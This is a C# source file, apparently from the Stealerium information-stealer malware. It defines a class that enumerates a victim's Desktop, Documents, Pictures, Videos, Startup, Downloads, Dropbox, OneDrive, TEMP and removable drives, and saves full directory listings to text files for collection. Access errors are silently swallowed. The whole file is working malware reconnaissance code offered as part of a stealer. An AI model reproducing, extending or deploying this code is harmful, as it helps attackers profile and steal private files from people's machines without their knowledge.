using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Stealerium.Target.System
{
    internal sealed class DirectoryTree
    {
        // Directories
        private static readonly List<string> TargetDirs = new List<string>
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
            Environment.GetFolderPath(Environment.SpecialFolder.Startup),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
            Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox"),
            Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "OneDrive"),
            Environment.GetEnvironmentVariable("TEMP")
        };

        // Get directory tree
        private static string GetDirectoryTree(string path, string indentation = "\t", int maxLevel = -1, int depth = 0)
        {
            if (!Directory.Exists(path)) return "Directory not exists";

            var directory = new DirectoryInfo(path);
            var builder = new StringBuilder();
            builder.AppendLine($"{string.Concat(Enumerable.Repeat(indentation, depth))}{directory.Name}\\");

            if (maxLevel == -1 || maxLevel > depth)
            {
                try
                {
                    foreach (var subdirectory in directory.GetDirectories())
                    {
                        try
                        {
                            builder.Append(GetDirectoryTree(subdirectory.FullName, indentation, maxLevel, depth + 1));
                        }
                        catch (UnauthorizedAccessException)
                        {
                            // ignored
                        }
                    }
                }
                catch (UnauthorizedAccessException)
                {
                    // ignored
                }
            }

            try
            {
                foreach (var file in directory.GetFiles())
                {
                    builder.AppendLine($"{string.Concat(Enumerable.Repeat(indentation, depth + 1))}{file.Name}");
                }
            }
            catch (UnauthorizedAccessException)
            {
                // ignored
            }

            return builder.ToString();
        }

        // Get directory name
        private static string GetDirectoryName(string path)
        {
            var name = new DirectoryInfo(path).Name;
            return name.Length == 3 ? $"DRIVE-{name.Replace(":\\", "")}" : name;
        }

        // Save directories tree
        public static void SaveDirectories(string sSavePath)
        {
            // Add USB, CD drives to directory structure
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == DriveType.Removable && drive.IsReady)
                {
                    TargetDirs.Add(drive.RootDirectory.FullName);
                }
            }

            // Create tasks for each path
            foreach (var path in TargetDirs)
            {
                try
                {
                    var results = GetDirectoryTree(path);
                    var dirname = GetDirectoryName(path);
                    if (!results.Contains("Directory not exists"))
                    {
                        File.WriteAllText(Path.Combine(sSavePath, $"{dirname}.txt"), results);
                    }
                }
                catch
                {
                    // ignored
                }
            }
        }
    }
}
